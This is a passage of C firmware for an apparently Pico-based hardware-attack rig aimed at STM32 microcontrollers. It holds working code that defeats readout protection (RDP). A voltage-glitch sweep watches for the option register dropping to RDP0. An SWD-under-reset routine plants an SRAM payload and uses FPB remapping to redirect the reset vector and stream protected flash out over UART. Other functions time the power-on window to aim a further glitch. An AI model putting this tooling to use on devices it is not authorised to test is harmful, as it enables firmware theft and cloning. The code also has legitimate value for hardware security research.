        while ((uint32_t)(time_us_64() - t0) < off) tight_loop_contents();
        gpio_clr_mask(POWER_MASK);
        uint64_t td = time_us_64();
        while ((uint32_t)(time_us_64() - td) < width) tight_loop_contents();
        gpio_set_mask(POWER_MASK);

        // --- let rail recover, then SWD-read OPTCR (connect AFTER the glitch) ---
        sleep_ms(8);
        uint32_t v = 0xFFFFFFFF;
        swd_init();
        bool con = swd_connect();
        bool rd = con && (swd_read_mem(optcr_addr, &v, 1) == 1);
        swd_deinit();

        if (!con || !rd) {
            noconn++;
        } else if (v != base) {
            changes++;
            uint8_t rdp = (v >> 8) & 0xFF;
            bool is_rdp0 = (rdp == info->rdp_level0);   // 0xAA
            if (is_rdp0) rdp0++;
            uart_cli_printf("  *CHANGE* [%lu] off=%luus w=%luus OPTCR 0x%08lX->0x%08lX RDPbyte 0x%02lX->0x%02X%s\r\n",
                            attempt, off, width, base, v, (base >> 8) & 0xFF, rdp,
                            is_rdp0 ? "  <<< RDP0!" : "");
        }

        if (attempt % 200 == 0)
            uart_cli_printf("  [%lu/%lu] off=%luus changes=%lu (rdp0=%lu) noconn=%lu\r\n",
                            attempt, max_attempts, off, changes, rdp0, noconn);

        wi++;
        if (wi >= NW) { wi = 0; off += OFF_STEP; if (off > OFF_MAX) off = OFF_MIN; }
    }

    uart_cli_printf("\r\nSHADOWSCAN done: %lu attempts, %lu OPTCR changes (%lu to RDP0), %lu no-connect.\r\n",
                    attempt, changes, rdp0, noconn);
    gpio_set_mask(POWER_MASK);
}

// STM32F1 RDP1 bypass via SWD halt + FPB redirect (no power glitch needed)
// Connects under reset, writes payload + FPB config via SWD, then flash-boots
// with FPB redirecting reset vector to stage 2 UART dump code in SRAM.
void target_power_halt(uint32_t dump_bytes) {
    extern bool swd_connect_under_reset(void);
    extern bool swd_halt(void);
    extern bool swd_resume(void);
    extern void swd_init(void);
    extern void swd_deinit(void);
    extern uint32_t swd_write_mem(uint32_t addr, const uint32_t *data, uint32_t count);
    extern uint32_t swd_read_mem(uint32_t addr, uint32_t *data, uint32_t count);

    const stm32_target_info_t *info = ensure_target_type();
    if (!info)
        return;

    uint32_t sram_base = info->sram_base;
    uint32_t payload_words = (sizeof(f103_rdp_bypass_diag_payload) + 3) / 4;

    // Default to full flash if no count specified
    if (dump_bytes == 0)
        dump_bytes = info->flash_size;
    // Round up to word boundary
    dump_bytes = (dump_bytes + 3) & ~3u;

    // Stage 2 entry point (thumb address) — from payload ELF symbols
    // stage2_start is at offset 0x3AC from SRAM base (diag payload with FPB reader + STOP debug kill)
    const uint32_t stage2_thumb_addr = sram_base + 0x3AC + 1;  // +1 for thumb bit

    uart_cli_printf("RDP1 HALT bypass: %u byte diag payload -> 0x%08lX, dumping %lu bytes\r\n",
                    (unsigned)sizeof(f103_rdp_bypass_diag_payload), sram_base, dump_bytes);
    uart_cli_printf("Stage 2 entry: 0x%08lX\r\n", stage2_thumb_addr);

    // === Step 1: Connect under reset, upload payload + configure FPB ===
    uart_cli_send("\r\n[1] Connecting under reset...\r\n");
    swd_init();

    // Set BOOT0=0 now (flash boot mode for after release)
    gpio_init(BOOT0_PIN);
    gpio_set_dir(BOOT0_PIN, GPIO_OUT);
    gpio_put(BOOT0_PIN, 0);
    gpio_init(BOOT1_PIN);
    gpio_set_dir(BOOT1_PIN, GPIO_OUT);
    gpio_put(BOOT1_PIN, 0);

    if (!swd_connect_under_reset()) {
        swd_deinit();
        uart_cli_send("ERROR: SWD connect under reset failed\r\n");
        return;
    }
    uart_cli_send("    Connected, core halted under reset\r\n");

    // === Step 2: Upload diag payload to SRAM ===
    uart_cli_send("[2] Uploading diag payload to SRAM...\r\n");
    uint32_t written = swd_write_mem(sram_base, (const uint32_t *)f103_rdp_bypass_diag_payload, payload_words);
    if (written != payload_words) {
        uart_cli_printf("ERROR: SRAM write failed (%lu/%lu words)\r\n", written, payload_words);
        swd_deinit();
        return;
    }

    // Verify write
    uint32_t readback[payload_words];
    uint32_t nread = swd_read_mem(sram_base, readback, payload_words);
    if (nread != payload_words || memcmp(readback, f103_rdp_bypass_diag_payload, sizeof(f103_rdp_bypass_diag_payload)) != 0) {
        uart_cli_send("ERROR: SRAM verify failed\r\n");
        swd_deinit();
        return;
    }
    uart_cli_send("    Payload uploaded and verified\r\n");

    // === Step 3: Configure FPB via SWD ===
    uart_cli_send("[3] Configuring FPB via SWD...\r\n");

    // Write stage 2 thumb address to remap table at 0x20000020
    // (this overwrites part of the NOP sled, which is fine — stage 1 won't run)
    uint32_t remap_val = stage2_thumb_addr;
    if (swd_write_mem(sram_base + 0x20, &remap_val, 1) != 1) {
        uart_cli_send("ERROR: Failed to write remap table\r\n");
        swd_deinit();
        return;
    }

    // FP_CTRL (0xE0002000) = 0x03: ENABLE + KEY
    uint32_t fp_ctrl = 0x03;
    if (swd_write_mem(0xE0002000, &fp_ctrl, 1) != 1) {
        uart_cli_send("ERROR: Failed to write FP_CTRL\r\n");
        swd_deinit();
        return;
    }

    // FP_REMAP (0xE0002004) = 0x20: remap table at 0x20000020 (bits[28:5])
    uint32_t fp_remap = 0x20000020;
    if (swd_write_mem(0xE0002004, &fp_remap, 1) != 1) {
        uart_cli_send("ERROR: Failed to write FP_REMAP\r\n");
        swd_deinit();
        return;
    }

    // FP_COMP0 (0xE0002008) = 0x05: ENABLE + match address 0x04 (REPLACE=00 remap)
    uint32_t fp_comp0 = 0x05;
    if (swd_write_mem(0xE0002008, &fp_comp0, 1) != 1) {
        uart_cli_send("ERROR: Failed to write FP_COMP0\r\n");
        swd_deinit();
        return;
    }

    // Verify FPB config
    uint32_t verify_val;
    swd_read_mem(0xE0002000, &verify_val, 1);
    uart_cli_printf("    FP_CTRL:  0x%08lX\r\n", verify_val);
    swd_read_mem(0xE0002004, &verify_val, 1);
    uart_cli_printf("    FP_REMAP: 0x%08lX\r\n", verify_val);
    swd_read_mem(0xE0002008, &verify_val, 1);
    uart_cli_printf("    FP_COMP0: 0x%08lX\r\n", verify_val);
    swd_read_mem(sram_base + 0x20, &verify_val, 1);
    uart_cli_printf("    Remap[0]: 0x%08lX (stage 2 entry)\r\n", verify_val);

    // Clear VC_CORERESET so core doesn't re-halt on resume
    uint32_t demcr_val = 0;
    swd_write_mem(0xE000EDFC, &demcr_val, 1);

    // === Step 4: Set PC to stage 1, resume, tri-state SWD ===
    uart_cli_send("[4] Running stage 1 (STOP/wake debug kill)...\r\n");
    extern bool swd_write_core_reg(uint8_t reg, uint32_t value);
    uint32_t stage1_addr = sram_base + 0x200 + 1;
    swd_write_core_reg(13, 0x20005000);
    swd_write_core_reg(15, stage1_addr);
    // Init UART before resume so we catch stage 1's diagnostic output
    uart_deinit(TARGET_UART_ID);
    gpio_deinit(TARGET_UART_RX_PIN);
    gpio_init(TARGET_UART_RX_PIN);
    uart_init(TARGET_UART_ID, 115200);
    uart_set_format(TARGET_UART_ID, 8, 1, UART_PARITY_NONE);
    gpio_set_function(TARGET_UART_RX_PIN, GPIO_FUNC_UART);

    // BMP cortexm_detach: 3-step DHCSR to clear C_DEBUGEN via DAP
    extern uint32_t swd_write_mem(uint32_t addr, const uint32_t *data, uint32_t count);
    uint32_t dhcsr_val;
    // Step 1: halt + debugen (ensure clean state)
    dhcsr_val = 0xA05F0003;  // DBGKEY | C_DEBUGEN | C_HALT
    swd_write_mem(0xE000EDF0, &dhcsr_val, 1);
    // Step 2: resume with debugen (clear C_HALT)
    dhcsr_val = 0xA05F0001;  // DBGKEY | C_DEBUGEN
    swd_write_mem(0xE000EDF0, &dhcsr_val, 1);
    // Step 3: clear C_DEBUGEN (core running, debug disabled)
    dhcsr_val = 0xA05F0000;  // DBGKEY only
    swd_write_mem(0xE000EDF0, &dhcsr_val, 1);
    // Tri-state SWD
    swd_deinit();

    // Wait for stage 1: clear debug + RTC setup + STOP + wake + UART report
    sleep_ms(200);

    // Read stage 1 diagnostic: "S1:X\n" where X = C_DEBUGEN after STOP/wake
    uart_cli_send("    Stage 1 report: ");
    int s1_chars = 0;
    while (uart_is_readable(TARGET_UART_ID) && s1_chars < 20) {
        uint8_t c = uart_getc(TARGET_UART_ID);
        uart_cli_printf("%02X ", c);
        s1_chars++;
    }
    if (s1_chars == 0) uart_cli_send("(nothing received)");
    uart_cli_send("\r\n");

    // === Step 5: Pulse nRST — FPB redirects reset vector to stage 2 ===
    uart_cli_send("[5] Pulsing nRST (flash boot with FPB redirect)...\r\n");
    uart_cli_send("[6] Receiving flash dump via UART...\r\n");

    // Drain FIFO before reset
    while (uart_is_readable(TARGET_UART_ID))
        uart_getc(TARGET_UART_ID);

    // Pulse nRST low then release — system reset preserves FPB
    uint8_t reset_pin = 15;  // GP15 = nRST
    gpio_init(reset_pin);
    gpio_set_dir(reset_pin, GPIO_OUT);
    gpio_put(reset_pin, 0);
    sleep_ms(10);
    gpio_put(reset_pin, 1);
    gpio_set_dir(reset_pin, GPIO_IN);
    gpio_pull_up(reset_pin);

    // --- Wait for "RDP1" header (scan byte-by-byte) ---
    #define HALT_TIMEOUT_US 5000000     // 5 second total timeout
    #define HALT_BYTE_TIMEOUT_US 500000 // 500ms idle = give up

    uint8_t hdr_state = 0;
    const char *hdr_str = "RDP1";
    uint64_t rx_start = time_us_64();
    uint64_t last_byte_time = rx_start;
    bool hdr_found = false;

    while (!hdr_found) {
        if (uart_is_readable(TARGET_UART_ID)) {
            uint8_t c = uart_getc(TARGET_UART_ID);
            last_byte_time = time_us_64();
            if (c == hdr_str[hdr_state]) {
                hdr_state++;
                if (hdr_state == 4) hdr_found = true;
            } else {
                hdr_state = (c == 'R') ? 1 : 0;
            }
        } else {
            if (time_us_64() - rx_start > HALT_TIMEOUT_US) break;
            if (hdr_state > 0 && (time_us_64() - last_byte_time > HALT_BYTE_TIMEOUT_US)) break;
        }
    }

    if (!hdr_found) {
        uart_cli_send("ERROR: \"RDP1\" header not received — stage 2 may not be executing\r\n");
        uart_cli_send("  FPB may have been cleared by reset, or debug access was blocked\r\n");
        goto halt_cleanup;
    }
    uart_cli_send("    Header: RDP1\r\n");

    // --- Receive CPUID (4 bytes) ---
    uint8_t cpuid_buf[4];
    for (int i = 0; i < 4; i++) {
        uint64_t t0 = time_us_64();
        while (!uart_is_readable(TARGET_UART_ID)) {
            if (time_us_64() - t0 > HALT_BYTE_TIMEOUT_US) {
                uart_cli_send("ERROR: Timeout reading CPUID\r\n");
                goto halt_cleanup;
            }
        }
        cpuid_buf[i] = uart_getc(TARGET_UART_ID);
    }
    uint32_t cpuid = cpuid_buf[0] | (cpuid_buf[1] << 8) |
                    (cpuid_buf[2] << 16) | (cpuid_buf[3] << 24);
    uint8_t implementer = (cpuid >> 24) & 0xFF;
    uint16_t partno = (cpuid >> 4) & 0xFFF;
    uart_cli_printf("    CPUID: 0x%08lX", cpuid);
    if (implementer == 0x41 && partno == 0xC23)
        uart_cli_printf(" (Cortex-M3 r%lup%lu)\r\n", (cpuid >> 20) & 0xF, cpuid & 0xF);
    else if (implementer == 0x41 && partno == 0xC24)
        uart_cli_send(" (Cortex-M4)\r\n");
    else
        uart_cli_send("\r\n");

    // --- Receive "DIAG" marker (4 bytes) ---
    uint8_t diag_state = 0;
    const char *diag_str = "DIAG";
    bool diag_found = false;
    uint64_t diag_start = time_us_64();

    while (!diag_found) {
        if (uart_is_readable(TARGET_UART_ID)) {
            uint8_t c = uart_getc(TARGET_UART_ID);
            if (c == diag_str[diag_state]) {
                diag_state++;
                if (diag_state == 4) diag_found = true;
            } else {
                diag_state = (c == 'D') ? 1 : 0;
            }
        } else {
            if (time_us_64() - diag_start > HALT_BYTE_TIMEOUT_US) break;
        }
    }

    if (!diag_found) {
        uart_cli_send("WARNING: \"DIAG\" marker not received — may be non-diag payload\r\n");
    } else {
        // Read 7 diagnostic registers (4 bytes each, little-endian)
        uart_cli_send("\r\n=== DIAGNOSTIC REGISTERS ===\r\n");
        struct {
            const char *name;
            uint32_t addr;
            const char *desc;
        } diag_regs[] = {
            {"DHCSR",     0xE000EDF0, "C_DEBUGEN"},
            {"DEMCR",     0xE000EDFC, "VC_CORERESET"},
            {"FP_CTRL",   0xE0002000, "FPB enable"},
            {"FP_COMP0",  0xE0002008, "comparator 0"},
            {"VTOR",      0xE000ED08, "vector table"},
            {"FLASH_OBR", 0x4002201C, "RDP status"},
            {"RCC_CSR",   0x40021024, "reset flags"},
        };

        for (int reg = 0; reg < 7; reg++) {
            uint8_t reg_buf[4];
            bool reg_ok = true;
            for (int i = 0; i < 4; i++) {
                uint64_t t0 = time_us_64();
                while (!uart_is_readable(TARGET_UART_ID)) {
                    if (time_us_64() - t0 > HALT_BYTE_TIMEOUT_US) {
                        reg_ok = false;
                        break;
                    }
                }
                if (!reg_ok) break;
                reg_buf[i] = uart_getc(TARGET_UART_ID);
            }
            if (!reg_ok) {
                uart_cli_printf("  %s: TIMEOUT\r\n", diag_regs[reg].name);
                break;
            }
            uint32_t val = reg_buf[0] | (reg_buf[1] << 8) |
                          (reg_buf[2] << 16) | (reg_buf[3] << 24);
            uart_cli_printf("  %-10s (0x%08lX) = 0x%08lX", diag_regs[reg].name, diag_regs[reg].addr, val);

            // Decode key bits
            if (reg == 0) { // DHCSR
                uart_cli_printf("  C_DEBUGEN=%lu", val & 1);
                if (val & (1 << 1)) uart_cli_send(" C_HALT");
                if (val & (1 << 17)) uart_cli_send(" S_HALT");
            } else if (reg == 1) { // DEMCR
                uart_cli_printf("  VC_CORERESET=%lu TRCENA=%lu", val & 1, (val >> 24) & 1);
            } else if (reg == 2) { // FP_CTRL
                uart_cli_printf("  ENABLE=%lu NUM_CODE=%lu", val & 1, (val >> 4) & 0xF);
            } else if (reg == 3) { // FP_COMP0
                uart_cli_printf("  ENABLE=%lu COMP=0x%08lX", val & 1, val & ~3u);
            } else if (reg == 4) { // VTOR
                uart_cli_printf("  %s", val == 0 ? "FLASH" : (val == 0x20000000 ? "SRAM" : "OTHER"));
            } else if (reg == 5) { // FLASH_OBR
                uart_cli_printf("  RDPRT=%lu", (val >> 1) & 1);
            } else if (reg == 6) { // RCC_CSR
                uart_cli_send(" ");
                if (val & (1 << 26)) uart_cli_send("PIN_RST ");
                if (val & (1 << 27)) uart_cli_send("POR ");
                if (val & (1 << 28)) uart_cli_send("SW_RST ");
                if (val & (1 << 29)) uart_cli_send("IWDG ");
                if (val & (1 << 30)) uart_cli_send("WWDG ");
                if (val & (1 << 31)) uart_cli_send("LPWR ");
            }
            uart_cli_send("\r\n");
        }
        uart_cli_send("============================\r\n");
    }

    // --- Stream flash data ---
    uart_cli_send("\r\n=== RDP1 HALT BYPASS — FLASH DUMP ===\r\n");
    uart_cli_printf("Dumping %lu bytes from 0x08000000:\r\n", dump_bytes);

    uint32_t rx_total = 0;
    uint8_t line_buf[16];
    uint32_t line_pos = 0;

    while (rx_total < dump_bytes) {
        uint64_t t0 = time_us_64();
        while (!uart_is_readable(TARGET_UART_ID)) {
            if (time_us_64() - t0 > HALT_BYTE_TIMEOUT_US) {
                if (line_pos > 0) {
                    uint32_t line_addr = 0x08000000 + rx_total - line_pos;
                    uart_cli_printf("0x%08lX:", line_addr);
                    for (uint32_t j = 0; j < line_pos; j++)
                        uart_cli_printf(" %02X", line_buf[j]);
                    for (uint32_t j = line_pos; j < 16; j++)
                        uart_cli_send("   ");
                    uart_cli_send("  ");
                    for (uint32_t j = 0; j < line_pos; j++) {
                        char c = line_buf[j];
                        uart_cli_printf("%c", (c >= 32 && c <= 126) ? c : '.');
                    }
                    uart_cli_send("\r\n");
                }
                uart_cli_printf("\r\nERROR: Timeout after %lu of %lu bytes\r\n", rx_total, dump_bytes);
                goto halt_reset;
            }
        }
        line_buf[line_pos++] = uart_getc(TARGET_UART_ID);
        rx_total++;

        if (line_pos == 16 || rx_total == dump_bytes) {
            uint32_t line_addr = 0x08000000 + rx_total - line_pos;
            uart_cli_printf("0x%08lX:", line_addr);
            for (uint32_t j = 0; j < line_pos; j++)
                uart_cli_printf(" %02X", line_buf[j]);
            for (uint32_t j = line_pos; j < 16; j++)
                uart_cli_send("   ");
            uart_cli_send("  ");
            for (uint32_t j = 0; j < line_pos; j++) {
                char c = line_buf[j];
                uart_cli_printf("%c", (c >= 32 && c <= 126) ? c : '.');
            }
            uart_cli_send("\r\n");
            line_pos = 0;
        }
    }

    uart_cli_printf("\r\nDump complete: %lu bytes received\r\n", rx_total);

halt_reset:
    uart_cli_send("[7] Power cycling target...\r\n");
    gpio_clr_mask(POWER_MASK);
    sleep_ms(100);
    gpio_set_mask(POWER_MASK);

halt_cleanup:
    gpio_put(BOOT0_PIN, 0);
    gpio_put(BOOT1_PIN, 0);
}

// Clean-wake control test (NO glitch, NO FPB, NO debugger-side debug clears).
// Upload payload to SRAM, set SRAM-boot pins, DETACH SWD, then nRST so the target
// cold-boots the payload with C_DEBUGEN=0 and no debugger. The payload sends
// "CLN0", enters STOP, self-wakes via RTC (~2ms), sends "WAKE" + FLASH_OBR, then
// tries a direct flash read ("DATA"+bytes, or "FAULT"). Captures raw target UART.
void target_power_cleanwake(void) {
    extern bool swd_connect_under_reset(void);
    extern void swd_init(void);
    extern void swd_deinit(void);
    extern uint32_t swd_write_mem(uint32_t addr, const uint32_t *data, uint32_t count);
    extern uint32_t swd_read_mem(uint32_t addr, uint32_t *data, uint32_t count);
    extern bool swd_write_core_reg(uint8_t reg, uint32_t value);

    const stm32_target_info_t *info = ensure_target_type();
    if (!info)
        return;

    uint32_t sram_base = info->sram_base;
    uint32_t payload_words = (sizeof(f103_rdp_cleanwake_payload) + 3) / 4;
    uint32_t entry = sram_base + 0x08 + 1;  // thumb entry (vector table = 8 bytes)

    uart_cli_printf("CLEAN-WAKE test: %u byte payload -> 0x%08lX (no glitch, no debug clears)\r\n",
                    (unsigned)sizeof(f103_rdp_cleanwake_payload), sram_base);

    // Upload via SWD under reset
    uart_cli_send("[1] Connecting under reset + uploading payload...\r\n");
    swd_init();
    if (!swd_connect_under_reset()) {
        swd_deinit();
        uart_cli_send("ERROR: SWD connect under reset failed\r\n");
        return;
    }
    if (swd_write_mem(sram_base, (const uint32_t *)f103_rdp_cleanwake_payload, payload_words)
            != payload_words) {
        swd_deinit();
        uart_cli_send("ERROR: SRAM write failed\r\n");
        return;
    }
    uint32_t readback[payload_words];
    if (swd_read_mem(sram_base, readback, payload_words) != payload_words ||
        memcmp(readback, f103_rdp_cleanwake_payload, sizeof(f103_rdp_cleanwake_payload)) != 0) {
        swd_deinit();
        uart_cli_send("ERROR: SRAM verify failed\r\n");
        return;
    }
    uart_cli_send("    Payload uploaded and verified\r\n");

    // Listen on target UART1 RX (GP5) before the payload starts talking
    uart_deinit(TARGET_UART_ID);
    gpio_deinit(TARGET_UART_RX_PIN);
    gpio_init(TARGET_UART_RX_PIN);
    uart_init(TARGET_UART_ID, 115200);
    uart_set_format(TARGET_UART_ID, 8, 1, UART_PARITY_NONE);
    gpio_set_function(TARGET_UART_RX_PIN, GPIO_FUNC_UART);
    while (uart_is_readable(TARGET_UART_ID)) uart_getc(TARGET_UART_ID);

    // Set SP + PC to the payload entry and RESUME with debug still enabled
    // (C_DEBUGEN=1). We do NOT clear C_DEBUGEN ourselves — the payload reports
    // its own DHCSR after the STOP/wake so we can see whether the sleep cleared it.
    uart_cli_send("[2] Set PC=entry, resume (C_DEBUGEN left set), then detach...\r\n");
    swd_write_core_reg(13, 0x20005000);   // SP
    swd_write_core_reg(15, entry);        // PC
    uint32_t dhcsr_run = 0xA05F0001;      // DBGKEY | C_DEBUGEN, C_HALT=0 -> run
    swd_write_mem(0xE000EDF0, &dhcsr_run, 1);

    // Stop the debug session: tri-state SWD. Core keeps running the payload.
    swd_deinit();

    // Capture raw bytes for up to 3s (500ms idle = done), hex+ASCII dump
    uart_cli_send("[3] Capturing target UART (payload runs autonomously)...\r\n");
    uint8_t buf[512];
    uint32_t n = 0;
    uint64_t start = time_us_64();
    uint64_t last = start;
    while (n < sizeof(buf)) {
        if (uart_is_readable(TARGET_UART_ID)) {
            buf[n++] = uart_getc(TARGET_UART_ID);
            last = time_us_64();
        } else {
            if (time_us_64() - start > 3000000) break;
            if (n > 0 && time_us_64() - last > 500000) break;
        }
    }

    if (n == 0) {
        uart_cli_send("    (nothing received — payload may not have booted)\r\n");
    } else {
        uart_cli_printf("    Received %lu bytes:\r\n", n);
        for (uint32_t i = 0; i < n; i += 16) {
            uart_cli_printf("  %04lX:", i);
            uint32_t line = (n - i < 16) ? (n - i) : 16;
            for (uint32_t j = 0; j < line; j++) uart_cli_printf(" %02X", buf[i + j]);
            for (uint32_t j = line; j < 16; j++) uart_cli_send("   ");
            uart_cli_send("  ");
            for (uint32_t j = 0; j < line; j++) {
                char c = buf[i + j];
                uart_cli_printf("%c", (c >= 32 && c <= 126) ? c : '.');
            }
            uart_cli_send("\r\n");
        }
    }

    uart_cli_send("[4] Power cycling target...\r\n");
    gpio_clr_mask(POWER_MASK);
    sleep_ms(100);
    gpio_set_mask(POWER_MASK);
}

// M1 of the shadow-load-glitch plan: characterize the POR power-up window.
// Power OFF -> ON, timestamp t_vdd (VDD rises through ~2.0V on ADC GP26) and
// t_nrst (nRST GP15 release = low->high after POR). The option-byte shadow load
// sits within [t_vdd, t_nrst]; jitter over N reps tells us how lockable the M2
// glitch delay will be. Non-destructive; runs at RDP0 or RDP1.
// ============================================================================
// SHADOWTRACE — ADC1/GP27 shunt-current trace of the POR window, to localize the
// option-byte shadow-load event so SHADOWBYPASS can aim its dip instead of
// brute-sweeping the full ~2.47ms window (per SHADOWCHAR). Power-on is the
// deterministic trigger (we drive POWER_MASK), so we capture ADC1 back-to-back
// from t0 and coherently AVERAGE over reps to lift the tiny option-byte-read
// current signature out of the noise. The shadow load sits in a ms-scale window,
// so the ~500ksps ADC (2us/sample) resolves it (unlike a sub-us instruction).
// No glitch is fired. REQUIRES the shunt wired in series with target VDD, GP27
// tapping across it (ADC1); without it the trace is meaningless (floating ADC).
// ============================================================================
void target_power_shadowtrace(uint32_t samples, uint32_t reps, uint32_t hold_nrst) {
    extern void power_ensure_init(void);
    if (samples == 0) samples = 1400;  if (samples > 4096) samples = 4096;
    if (reps == 0)    reps    = 20;    if (reps > 500)    reps    = 500;

    power_ensure_init();
    gpio_init(reset_pin);
    if (hold_nrst) {
        // Drive nRST LOW throughout: hold the core in reset so OBL/PLL/core-start
        // never run. If a trace feature survives this, it's a rig/rail/analog
        // artifact, not chip reset-exit activity.
        gpio_set_dir(reset_pin, GPIO_OUT); gpio_put(reset_pin, 0);
    } else {
        gpio_set_dir(reset_pin, GPIO_IN); gpio_pull_up(reset_pin);
    }
    adc_power_init();

    static uint16_t buf[4096];
    static uint32_t acc[4096];
    for (uint32_t i = 0; i < samples; i++) acc[i] = 0;

    uart_cli_printf("SHADOWTRACE: ADC1/GP27 shunt current during POR — %lu samples x %lu reps%s\r\n",
                    (unsigned long)samples, (unsigned long)reps,
                    hold_nrst ? "  [nRST HELD LOW — core in reset]" : "");
    uart_cli_send("SHADOWTRACE: REQUIRES shunt in series with target VDD, GP27 across it. No glitch fired.\r\n");

    uint32_t t_end_us = 0;
    // Track the SAMPLE INDEX at which nRST (GP15) releases high after POR, so the
    // trace can be reported in JG's frame (times relative to nRST, not power-on).
    uint64_t nrst_idx_sum = 0; uint32_t nrst_idx_valid = 0;
    for (uint32_t r = 0; r < reps; r++) {
        // full power-down POR (SWEEP/SHADOWCHAR idiom)
        gpio_set_dir(POWER_PIN1, GPIO_OUT);
        gpio_set_dir(POWER_PIN2, GPIO_OUT);
        gpio_set_dir(POWER_PIN3, GPIO_OUT);
        gpio_clr_mask(POWER_MASK);
        sleep_ms(200);
        adc_select_input(1);                 // ADC1 = GP27 shunt current
        // power ON = t0, then capture back-to-back (~2us/sample). Each sample also
        // reads GP15 to catch the nRST low->high (POR release) edge.
        uint32_t nrst_i = 0xFFFFFFFF; bool seen_low = false;
        uint64_t t0 = time_us_64();
        gpio_set_mask(POWER_MASK);
        for (uint32_t i = 0; i < samples; i++) {
            buf[i] = (uint16_t)adc_read();
            bool hi = gpio_get(reset_pin);
            if (!hi) seen_low = true;
            if (nrst_i == 0xFFFFFFFF && hi && seen_low) nrst_i = i;
        }
        uint32_t el = (uint32_t)(time_us_64() - t0);
        if (r == 0) t_end_us = el;
        for (uint32_t i = 0; i < samples; i++) acc[i] += buf[i];
        if (nrst_i != 0xFFFFFFFF) { nrst_idx_sum += nrst_i; nrst_idx_valid++; }
    }

    float us_per = (t_end_us > 0) ? (float)t_end_us / samples : 2.0f;
    // nRST-release time (JG's reference frame). -1 if not captured in-window.
    float nrst_us = nrst_idx_valid ? ((float)nrst_idx_sum / nrst_idx_valid) * us_per : -1.0f;
    // bin-average into ROWS rows for a legible profile; mark the SHADOWCHAR window
    const uint32_t ROWS = 100;
    uint32_t per = (samples + ROWS - 1) / ROWS;
    // Precompute the binned averages once (so we can scale without recomputing).
    static uint16_t binv[100];   // ROWS
    uint32_t nb = 0;
    uint32_t rmin = 0xFFFFFFFF, rmax = 0;
    for (uint32_t b = 0; b * per < samples && nb < ROWS; b++) {
        uint64_t s = 0; uint32_t n = 0;
        for (uint32_t i = b * per; i < (b + 1) * per && i < samples; i++) { s += acc[i]; n++; }
        uint32_t v = n ? (uint32_t)(s / n / reps) : 0;
        binv[nb++] = (uint16_t)v;
        if (v < rmin) rmin = v; if (v > rmax) rmax = v;
    }
    uint32_t rspan = (rmax > rmin) ? (rmax - rmin) : 1;
    // The high-side shunt rails near ADC full-scale on the plateau; the early
    // rail-charging ramp drags rmin down and squashes the plateau/dip detail into
    // a wall of full-width bars. Auto-zoom the BAR scale to the settled region
    // (after the ramp first reaches 90% of the full range) so surges/sags show.
    uint32_t chg_thr = rmin + (rspan * 90u) / 100u;
    uint32_t charged = 0;
    for (uint32_t b = 0; b < nb; b++) { if (binv[b] >= chg_thr) { charged = b; break; } }
    uint32_t smin = 0xFFFFFFFF, smax = 0;
    for (uint32_t b = charged; b < nb; b++) { if (binv[b] < smin) smin = binv[b]; if (binv[b] > smax) smax = binv[b]; }
    if (smin == 0xFFFFFFFF) { smin = rmin; smax = rmax; }  // no settled region found
    uint32_t sspan = (smax > smin) ? (smax - smin) : 1;
    uart_cli_printf("SHADOWTRACE: %.2fus/sample, window ~%.2fms; shunt raw %lu..%lu (delta %lu LSB). SHADOWCHAR window = 40us..2513us.\r\n",
                    us_per, samples * us_per / 1000.0f,
                    (unsigned long)rmin, (unsigned long)rmax, (unsigned long)rspan);
    uart_cli_printf("SHADOWTRACE: bars auto-zoomed to settled band %lu..%lu LSB (ramp ends ~%.0fus); '^'=clipped above band.\r\n",
                    (unsigned long)smin, (unsigned long)smax, charged * per * us_per);
    if (nrst_us >= 0.0f)
        uart_cli_printf("SHADOWTRACE: nRST releases at +%.0fus after power-on (%lu/%lu reps); 'n=' column = time vs nRST (JG frame).\r\n",
                        nrst_us, (unsigned long)nrst_idx_valid, (unsigned long)reps);
    else
        uart_cli_send("SHADOWTRACE: nRST release NOT seen in capture window — increase samples to bring it in-frame.\r\n");
    for (uint32_t b = 0; b < nb; b++) {
        uint32_t v = binv[b];
        float t_us = b * per * us_per;
        int bars;
        if (v <= smin) bars = 0;
        else if (v >= smax) bars = 40;
        else bars = (int)((v - smin) * 40u / sspan);
        char over = (v > smax) ? '^' : ' ';   // above the zoomed band (ramp peak)
        char bar[41];
        for (int k = 0; k < 40; k++) bar[k] = (k < bars) ? '#' : ' ';
        bar[40] = '\0';
        const char *mark = (t_us >= 40.0f && t_us <= 2513.0f) ? " <-win" : "";
        // nRST-relative time (JG frame); flag the bin holding the nRST edge.
        char nrel[24] = "";
        if (nrst_us >= 0.0f) {
            bool is_nrst = (t_us <= nrst_us && t_us + per * us_per > nrst_us);
            snprintf(nrel, sizeof(nrel), " n=%+6.0f%s", t_us - nrst_us, is_nrst ? " <nRST" : "");
        }
        uart_cli_printf("  t=+%6.0fus raw=%4lu |%s|%c%s%s\r\n", t_us, (unsigned long)v, bar, over, mark, nrel);
    }
    // Raw CSV of EVERY sample (full time resolution) for unclipped external
    // plotting: t_us:raw pairs, reps-averaged, no binning.
    uart_cli_printf("SHADOWTRACE_NRST_US:%.1f\r\n", nrst_us);
    uart_cli_send("SHADOWTRACE_CSV:");
    for (uint32_t i = 0; i < samples; i++)
        uart_cli_printf("%.1f:%lu%s", i * us_per, (unsigned long)(acc[i] / reps), (i + 1 < samples) ? "," : "");
    uart_cli_send("\r\n");
    // Release nRST back to input so we don't leave the target held in reset.
    if (hold_nrst) { gpio_set_dir(reset_pin, GPIO_IN); gpio_pull_up(reset_pin); }
    uart_cli_send("SHADOWTRACE: done. A current bump inside the window = flash-controller/option-byte activity; aim SHADOWBYPASS there.\r\n");
}

void target_power_shadowchar(uint32_t iterations) {
    if (iterations == 0) iterations = 10;

    power_ensure_init();
    // nRST as input w/ pull-up so we can watch the target drive/release it
    gpio_init(reset_pin);
    gpio_set_dir(reset_pin, GPIO_IN);
    gpio_pull_up(reset_pin);
    // Read GP26 like TARGET GLITCH SWEEP does.
    adc_power_init();
    adc_select_input(ADC_POWER_CHAN);

    const uint16_t vdd_thresh = 2482;  // ~2.0V (2.0/3.3*4095)

    uart_cli_printf("Shadow-load window characterization — %lu iterations\r\n", iterations);
    uart_cli_send("  t_vdd  = VDD rises through ~2.0V (ADC GP26)\r\n");
    uart_cli_send("  t_nrst = nRST (GP15) releases high after POR\r\n");
    uart_cli_send("  option-byte shadow load occurs within [t_vdd, t_nrst]\r\n\r\n");

    // Diagnostic: rail is ~3.3V (SWD confirms). Test whether the ADC just needs
    // time to stabilize after adc_init() (climbing reads = warm-up, not the rail).
    // NOTE: ADC t_vdd requires a healthy rail. If the target flash is corrupt it
